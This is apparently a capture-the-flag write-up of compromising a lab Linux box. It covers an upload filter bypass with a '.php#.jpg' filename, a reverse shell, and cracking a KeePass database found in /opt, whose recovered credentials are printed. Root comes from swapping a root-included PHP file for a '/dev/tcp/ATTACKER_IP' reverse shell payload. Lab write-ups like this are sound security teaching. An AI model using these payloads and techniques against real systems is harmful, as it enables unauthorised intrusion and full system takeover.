# Machine Information

**Target IP:** 10.49.191.54

This box was a nice mix of a sloppy file upload filter, a KeePass database left lying around in `/opt`, and a classic "writable directory, not-writable file" privilege escalation bug at the end. Let's go through how it went down.

# Enumeration

## Nmap

Kicked things off with a full SYN scan:

```
nmap -Pn -sSV 10.49.191.54 -v -n

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports: SSH, a web server, and Samba on both 139 and 445. That combo (web + SMB) usually means there might be either loot sitting on a share, or the web app is the main way in and SMB is just a secondary attack surface. I checked both.

## Web Enumeration

First, a quick curl to see what the webserver does on a bare request:

```
curl -I 10.49.191.54
HTTP/1.1 302 Found
Server: Apache/2.4.41 (Ubuntu)
location: login.php
```

So the root just bounces you to `login.php`. Nothing to log into yet since I had no creds, so I moved on to checking the SMB side before coming back to the web app.

## Service Enumeration

I tried an anonymous/null SMB login just to see if guest access was allowed:

```
crackmapexec smb 10.49.191.54 -u '' -p ''
SMB   10.49.191.54   445   IP-10-49-191-54  [*] Windows 6.1 Build 0 (name:IP-10-49-191-54) (domain:ap-south-1.compute.internal) (signing:False) (SMBv1:False)
SMB   10.49.191.54   445   IP-10-49-191-54  [+] ap-south-1.compute.internal\:
```

The null login actually went through (that `[+]` line confirms it), but I didn't find anything useful to pull from shares at that point, so I put SMB on the back burner and focused on the website instead, since that felt like the more promising lead.

I ran feroxbuster against the root of the site to find hidden paths, since the login page alone wasn't going to get me anywhere without credentials:

```
feroxbuster -u http://10.49.191.54/ -v -m GET
```

That turned up a few things:

```
302      GET        0l        0w        0c http://10.49.191.54/ => login.php
301      GET        9l       28w      310c http://10.49.191.54/css => http://10.49.191.54/css/
301      GET        9l       28w      312c http://10.49.191.54/cloud => http://10.49.191.54/cloud/
301      GET        9l       28w      319c http://10.49.191.54/cloud/images => http://10.49.191.54/cloud/images/
```

The `/cloud` directory stood out immediately, so I opened it in the browser.

# Initial Foothold

The `/cloud/` path led to a page called **"5 Minutes File Upload - Personal Cloud Storage"**, which was basically a simple image upload form: pick a file, hit "Upload Image," and it stores it somewhere on the server. Any time I see a raw file upload feature like this with no login required, that's a huge red flag, since these self-hosted upload tools are notorious for weak file type validation.

<p>
  <img src="image/opacity.png" width="540"/>
</p>

I tried uploading a PHP file, but instead of naming it something obvious like `pay.php`, I renamed it using the extension trick `pay.php#.jpg`. The idea here is that a lot of these upload forms only check that the filename *looks* like it ends in an image extension (often using a simple string check), so tacking `#.jpg` onto the end of a `.php` file can slip past that kind of validation while the file still actually gets saved and treated as PHP by the server. Sure enough, it accepted the upload, and it landed at:

```
http://10.49.191.54/cloud/images/pay.php#.jpg
```

I set up a Python HTTP server on my machine to catch a GET request as a way to sanity-check that the browser was actually reaching my payload, and got a netcat listener ready to catch the reverse shell:

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.151.76] from (UNKNOWN) [10.49.191.54] 52948
Linux ip-10-49-191-54 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell came back as `www-data`, confirming the upload filter bypass worked and the file executed as PHP. I upgraded the shell to something usable right away:

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Privilege Escalation

With a working shell, I started poking around outside the web root, since `/opt` is a common spot for admins to dump random files. That instinct paid off:

```
www-data@ip-10-49-191-54:/opt$ ls
dataset.kdbx
```

A `.kdbx` file is a KeePass password database, so this was obviously worth grabbing. I spun up a Python HTTP server *on the target* to serve the file out, and pulled it down from my attacking machine with wget:

```
www-data@ip-10-49-191-54:/opt$ python3 -m http.server
```

```
wget http://10.49.191.54:8000/dataset.kdbx
Length: 1566 (1.5K) [application/octet-stream]
Saving to: 'dataset.kdbx'
```

I confirmed the file type just to be sure:

```
file dataset.kdbx
dataset.kdbx: Keepass password database 2.x KDBX
```

KeePass databases are locked behind a master password, so the next move was trying to crack that password offline. I extracted a crackable hash with `keepass2john`:

```
keepass2john dataset.kdbx > dataset.hash
john dataset.hash
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
No password hashes left to crack (see FAQ)
```

John told me there was nothing left to crack, which usually means it had already cracked this exact hash before (i had already beat this challenge earlier), so I just asked it to show me the result instead of running it again:

```
john --show dataset.hash
dataset:741852963
```

Master password was `741852963`. With that, I unlocked the database and listed what was inside:

```
keepassxc-cli ls dataset.kdbx
Enter password to unlock dataset.kdbx: 
user:password
```

There was one entry, helpfully named `user:password`, so I pulled the details out of it:

```
keepassxc-cli show dataset.kdbx "user:password" -s
Enter password to unlock dataset.kdbx: 
Title: user:password
UserName: sysadmin
Password: Cl0udP4ss40p4city#8700
```

That gave me a username, `sysadmin`, and a password. I remembered seeing a `sysadmin` account earlier when I checked `/etc/passwd` for shell accounts on the box:

```
$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

Login into ssh with `sysadmin`, and that worked right away:

```
ssh sysadmin@10.49.191.54
sysadmin@10.49.191.54's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
sysadmin@ip-10-49-191-54:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
```

Now logged in as `sysadmin`, I went through the usual privilege escalation checklist. SUID binaries turned up nothing unusual (just the standard system ones), `sudo -l` told me I wasn't allowed to run sudo at all, and cron entries in `/etc/cron.d` were all just default Ubuntu housekeeping jobs (session cleanup, e2scrub, popularity-contest) nothing custom or exploitable there.

What did catch my eye was inside my own home directory:

```
sysadmin@ip-10-49-191-54:~$ ls
local.txt  scripts
sysadmin@ip-10-49-191-54:~$ cd scripts/
sysadmin@ip-10-49-191-54:~/scripts$ ls
lib  script.php
```

I grabbed `local.txt` (the user flag) and then looked at what `script.php` was doing:

```
cat script.php

<?php
//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

This script backs up the `scripts` folder into `/var/backups/backup.zip` and also cleans out the uploaded images from `/cloud/images` (which explains why it's called "5 Minutes File Upload" uploads probably get wiped out periodically by this exact script). The fact that it writes to `/var/backups` and touches `/var/www/html` strongly suggested it runs with elevated privileges, most likely as `root` on some kind of schedule, even though I couldn't see that specific job in the crontab I had access to.

The interesting part was the `lib` folder that `script.php` pulls its `backup.inc.php` include from:

```
cd lib
ls -la
total 132
drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
...
```

The individual files inside `lib` are owned by `root`, but look closely at the directory itself: `lib` is owned by `sysadmin:root`. That's the classic setup where the files can't be edited directly, but since I own the *directory*, I can delete and recreate files inside it file deletion permission depends on the directory, not the file itself. I tested that theory:

```
rm backup.inc.php
rm: remove write-protected regular file 'backup.inc.php'? yes
```

It let me delete a root-owned file just because I had write access to the parent directory. That confirmed the bug. From there, I just needed to write my own malicious version of `backup.inc.php` in its place, since `script.php` includes it by path and doesn't care who owns it whatever runs that script next (presumably root, on a timer) would execute whatever code I put in there.

I opened nano and wrote a new `backup.inc.php` containing a PHP reverse shell payload:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'"); ?>
```

Then I just had to wait for whatever scheduled task runs `script.php` to fire again.

# Root

I set up a listener and waited:

```
nc -lvnp 9999
listening on [any] 9999 ...
```

About a minute later, the scheduled job kicked in, ran `script.php`, which pulled in my poisoned `backup.inc.php`, and executed my reverse shell payload as root:

```
connect to [192.168.151.76] from (UNKNOWN) [10.49.191.54] 48174
bash: cannot set terminal process group (2117): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-49-191-54:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-49-191-54:~# whoami
root
```

Root, done.

# Lessons Learned

- **File upload filters that only check the filename string are easy to bypass.** The `.php#.jpg` trick got a PHP web shell past the upload form's validation and gave straight up code execution as `www-data`.
- **Random files sitting in `/opt` are always worth checking.** The `dataset.kdbx` KeePass database was just sitting there in plain sight and ended up holding valid credentials for the `sysadmin` account.
- **Offline cracking tools remember previous work.** John reported the KeePass hash was already cracked, so `--show` was all that was needed to get the password back out no need to re-run the whole attack.
- **Directory ownership beats file ownership when it comes to deleting/replacing files.** Even though `backup.inc.php` was owned by `root`, the `lib` directory itself was owned by `sysadmin`, which meant I could delete and swap the file out entirely. Since a root-run script blindly included that file, this became a straightforward path to a root shell this is a great reminder to always check who owns the *folder*, not just the file, when hunting for privesc bugs.
